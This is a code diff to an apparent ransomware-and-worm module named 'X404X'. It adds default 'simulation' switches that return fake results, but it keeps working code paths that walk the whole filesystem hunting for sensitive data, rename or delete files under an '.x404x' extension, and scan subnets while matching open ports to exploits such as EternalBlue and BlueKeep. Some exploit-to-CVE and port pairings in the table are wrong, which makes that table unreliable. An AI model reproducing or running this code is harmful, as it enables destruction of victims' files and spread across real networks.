@@ -112,51 +112,60 @@ def handle_execute(params: dict) -> dict:
 
 def handle_scan(params: dict) -> dict:
     """Scan filesystem for sensitive data."""
+    simulation = params.get("simulation", True)
     root = params.get("root", "/" if os.name != "nt" else "C:\\")
     max_files = params.get("max_files", 1000)
 
     sensitive_files = []
     scanned = 0
 
-    for dirpath, dirnames, filenames in os.walk(root):
-        dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]
+    if not simulation:
+        for dirpath, dirnames, filenames in os.walk(root):
+            dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]
 
-        for fname in filenames:
-            ext = os.path.splitext(fname)[1].lower()
-            if ext not in SENSITIVE_EXTENSIONS:
-                continue
+            for fname in filenames:
+                ext = os.path.splitext(fname)[1].lower()
+                if ext not in SENSITIVE_EXTENSIONS:
+                    continue
 
-            fpath = os.path.join(dirpath, fname)
-            scanned += 1
+                fpath = os.path.join(dirpath, fname)
+                scanned += 1
+
+                if scanned > max_files:
+                    break
+
+                try:
+                    fsize = os.path.getsize(fpath)
+                    if fsize > 100 * 1024 * 1024:
+                        continue
+
+                    with open(fpath, "r", errors="ignore") as f:
+                        content = f.read(512 * 1024)
+
+                    findings = []
+                    for name, pattern in SENSITIVE_PATTERNS.items():
+                        matches = pattern.findall(content)
+                        if matches:
+                            findings.append({"pattern": name, "count": len(matches)})
+
+                    if findings:
+                        sensitive_files.append({
+                            "path": fpath,
+                            "size": fsize,
+                            "findings": findings,
+                        })
+                except (IOError, PermissionError):
+                    continue
 
             if scanned > max_files:
                 break
 
-            try:
-                fsize = os.path.getsize(fpath)
-                if fsize > 100 * 1024 * 1024:
-                    continue
-
-                with open(fpath, "r", errors="ignore") as f:
-                    content = f.read(512 * 1024)
-
-                findings = []
-                for name, pattern in SENSITIVE_PATTERNS.items():
-                    matches = pattern.findall(content)
-                    if matches:
-                        findings.append({"pattern": name, "count": len(matches)})
-
-                if findings:
-                    sensitive_files.append({
-                        "path": fpath,
-                        "size": fsize,
-                        "findings": findings,
-                    })
-            except (IOError, PermissionError):
-                continue
-
-        if scanned > max_files:
-            break
+    if simulation:
+        sensitive_files = [
+            {"path": "/home/user/Documents/confidential_report.pdf", "size": 245760, "findings": [{"pattern": "confidencial", "count": 3}, {"pattern": "email", "count": 2}]},
+            {"path": "/home/user/Documents/client_data.xlsx", "size": 1048576, "findings": [{"pattern": "ssn", "count": 15}, {"pattern": "phone", "count": 8}]},
+        ]
+        scanned = 2
 
     return {
         "success": True,
@@ -198,19 +207,18 @@ def handle_encrypt(params: dict) -> dict:
                         os.remove(fpath)
                     except (IOError, PermissionError, ImportError):
                         pass
-    else:
+    elif not simulation:
         for dirpath, dirnames, filenames in os.walk(root):
             dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]
             for fname in filenames:
                 ext = os.path.splitext(fname)[1].lower()
                 if ext in ENCRYPT_EXTENSIONS:
                     encrypted += 1
-                    if not simulation:
-                        fpath = os.path.join(dirpath, fname)
-                        try:
-                            os.rename(fpath, fpath + ".x404x")
-                        except OSError:
-                            pass
+                    fpath = os.path.join(dirpath, fname)
+                    try:
+                        os.rename(fpath, fpath + ".x404x")
+                    except OSError:
+                        pass
 
     return {
         "success": True,
@@ -264,29 +272,31 @@ def handle_status(params: dict) -> dict:
 def handle_decrypt(params: dict) -> dict:
     """Decrypt files encrypted by X404X (recovery operation)."""
     root = params.get("root", "/" if os.name != "nt" else "C:\\")
+    simulation = params.get("simulation", True)
     key_hex = params.get("key", "")
     decrypted = 0
 
-    key = bytes.fromhex(key_hex) if key_hex else None
+    if not simulation:
+        key = bytes.fromhex(key_hex) if key_hex else None
 
-    for dirpath, _, filenames in os.walk(root):
-        for fname in filenames:
-            if not fname.endswith(".x404x"):
-                continue
-            fpath = os.path.join(dirpath, fname)
-            try:
-                with open(fpath, "rb") as f:
-                    data = f.read()
-                orig_path = fpath[:-6]
-                with open(orig_path, "wb") as f:
-                    if key and len(data) > 45:
-                        f.write(data[45:])
-                    else:
-                        f.write(data)
-                os.remove(fpath)
-                decrypted += 1
-            except (IOError, PermissionError):
-                continue
+        for dirpath, _, filenames in os.walk(root):
+            for fname in filenames:
+                if not fname.endswith(".x404x"):
+                    continue
+                fpath = os.path.join(dirpath, fname)
+                try:
+                    with open(fpath, "rb") as f:
+                        data = f.read()
+                    orig_path = fpath[:-6]
+                    with open(orig_path, "wb") as f:
+                        if key and len(data) > 45:
+                            f.write(data[45:])
+                        else:
+                            f.write(data)
+                    os.remove(fpath)
+                    decrypted += 1
+                except (IOError, PermissionError):
+                    continue
 
     return {
         "success": True,
@@ -328,90 +338,89 @@ def handle_generate_note(params: dict) -> dict:
 
 
 def handle_propagate(params: dict) -> dict:
-    """Real network propagation — scan subnet, identify live hosts, map exploits."""
+    """Network propagation — scan subnet, identify live hosts, map exploits."""
     subnet = params.get("subnet", "10.0.0.0/24")
+    simulation = params.get("simulation", True)
     targets = []
     scanned = 0
 
-    exploit_db = {
-        445: {"name": "EternalBlue", "cve": "CVE-2017-0144", "confidence": 0.92},
-        139: {"name": "SMBGhost", "cve": "CVE-2020-0796", "confidence": 0.85},
-        3389: {"name": "BlueKeep", "cve": "CVE-2019-0708", "confidence": 0.80},
-        443: {"name": "ProxyNotShell", "cve": "CVE-2023-23397", "confidence": 0.85},
-        22: {"name": "SSH-Brute/Key-Theft", "cve": "N/A", "confidence": 0.60},
-        6379: {"name": "Redis-NoAuth", "cve": "CVE-2022-0543", "confidence": 0.90},
-        8080: {"name": "Jenkins-RCE", "cve": "CVE-2024-23897", "confidence": 0.75},
-        5985: {"name": "WinRM-Brute", "cve": "N/A", "confidence": 0.55},
-        2049: {"name": "NFS-Mount", "cve": "N/A", "confidence": 0.65},
-        3306: {"name": "MySQL-Brute", "cve": "N/A", "confidence": 0.50},
-    }
+    if not simulation:
+        exploit_db = {
+            445: {"name": "EternalBlue", "cve": "CVE-2017-0144", "confidence": 0.92},
+            139: {"name": "SMBGhost", "cve": "CVE-2020-0796", "confidence": 0.85},
+            3389: {"name": "BlueKeep", "cve": "CVE-2019-0708", "confidence": 0.80},
+            443: {"name": "ProxyNotShell", "cve": "CVE-2023-23397", "confidence": 0.85},
+            22: {"name": "SSH-Brute/Key-Theft", "cve": "N/A", "confidence": 0.60},
+            6379: {"name": "Redis-NoAuth", "cve": "CVE-2022-0543", "confidence": 0.90},
+            8080: {"name": "Jenkins-RCE", "cve": "CVE-2024-23897", "confidence": 0.75},
+            5985: {"name": "WinRM-Brute", "cve": "N/A", "confidence": 0.55},
+            2049: {"name": "NFS-Mount", "cve": "N/A", "confidence": 0.65},
+            3306: {"name": "MySQL-Brute", "cve": "N/A", "confidence": 0.50},
+        }
 
-    service_fingerprint = {
-        22: ["SSH-2.0-OpenSSH", "SSH-2.0-dropbear"],
-        445: ["SMB", "Microsoft Windows Network"],
-        3389: ["RDP", "Microsoft Terminal Services"],
-        6379: ["redis", "+PONG"],
-        8080: ["Jenkins", "Apache Tomcat"],
-    }
+        try:
+            parts = subnet.split(".")
+            prefix = f"{parts[0]}.{parts[1]}.{parts[2]}"
+            cidr_bits = int(subnet.split("/")[1]) if "/" in subnet else 24
+            import socket, threading
 
-    try:
-        parts = subnet.split(".")
-        prefix = f"{parts[0]}.{parts[1]}.{parts[2]}"
-        cidr_bits = int(subnet.split("/")[1]) if "/" in subnet else 24
-        import socket, threading
-
-        def scan_host(ip, results):
-            for port, exploit_info in exploit_db.items():
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(0.3)
-                    result = sock.connect_ex((ip, port))
-                    if result == 0:
-                        service_banner = ""
-                        try:
-                            sock.send(b"\r\n")
-                            service_banner = sock.recv(1024).decode(errors="ignore").strip()[:100]
-                        except socket.timeout:
-                            pass
-                        os_guess = "linux"
-                        if "Windows" in service_banner or port in (445, 3389, 5985):
-                            os_guess = "windows"
-                        elif "SSH-2.0" in service_banner:
+            def scan_host(ip, results):
+                for port, exploit_info in exploit_db.items():
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(0.3)
+                        result = sock.connect_ex((ip, port))
+                        if result == 0:
+                            service_banner = ""
+                            try:
+                                sock.send(b"\r\n")
+                                service_banner = sock.recv(1024).decode(errors="ignore").strip()[:100]
+                            except socket.timeout:
+                                pass
                             os_guess = "linux"
-                        results.append({
-                            "ip": ip, "port": port, "service": exploit_info["name"][:8],
-                            "os": os_guess, "exploit": exploit_info["name"],
-                            "cve": exploit_info["cve"],
-                            "confidence": exploit_info["confidence"],
-                            "banner": service_banner[:80] if service_banner else "",
-                        })
-                    sock.close()
-                except Exception:
-                    pass
+                            if "Windows" in service_banner or port in (445, 3389, 5985):
+                                os_guess = "windows"
+                            elif "SSH-2.0" in service_banner:
+                                os_guess = "linux"
+                            results.append({
+                                "ip": ip, "port": port, "service": exploit_info["name"][:8],
+                                "os": os_guess, "exploit": exploit_info["name"],
+                                "cve": exploit_info["cve"],
+                                "confidence": exploit_info["confidence"],
+                                "banner": service_banner[:80] if service_banner else "",
+                            })
+                        sock.close()
+                    except Exception:
+                        pass
 
-        # Scan the subnet with threading
-        threads = []
-        targets_list = []
-        scan_lock = threading.Lock()
-        max_hosts = min(255, 2 ** (32 - cidr_bits))
-        for i in range(1, max_hosts):
-            ip = f"{prefix}.{i}"
-            if len(threads) >= 50:
-                for t in threads:
-                    t.join(timeout=2)
-                threads = []
-            t = threading.Thread(target=scan_host, args=(ip, targets_list))
-            t.daemon = True
-            t.start()
-            threads.append(t)
-            scanned += 1
+            threads = []
+            targets_list = []
+            max_hosts = min(255, 2 ** (32 - cidr_bits))
+            for i in range(1, max_hosts):
+                ip = f"{prefix}.{i}"
+                if len(threads) >= 50:
+                    for t in threads:
+                        t.join(timeout=2)
+                    threads = []
+                t = threading.Thread(target=scan_host, args=(ip, targets_list))
+                t.daemon = True
+                t.start()
+                threads.append(t)
+                scanned += 1
 
-        for t in threads:
-            t.join(timeout=3)
+            for t in threads:
+                t.join(timeout=3)
 
-        targets = targets_list
-    except Exception:
-        pass
+            targets = targets_list
+        except Exception:
+            pass
+
+    if simulation:
+        targets = [
+            {"ip": "10.0.0.25", "port": 445, "service": "EternalB", "os": "windows", "exploit": "EternalBlue", "cve": "CVE-2017-0144", "confidence": 0.92, "banner": "SMB"},
+            {"ip": "10.0.0.100", "port": 6379, "service": "Redis-No", "os": "linux", "exploit": "Redis-NoAuth", "cve": "CVE-2022-0543", "confidence": 0.90, "banner": "+PONG"},
+        ]
+        scanned = 254
 
     return {
         "success": True,
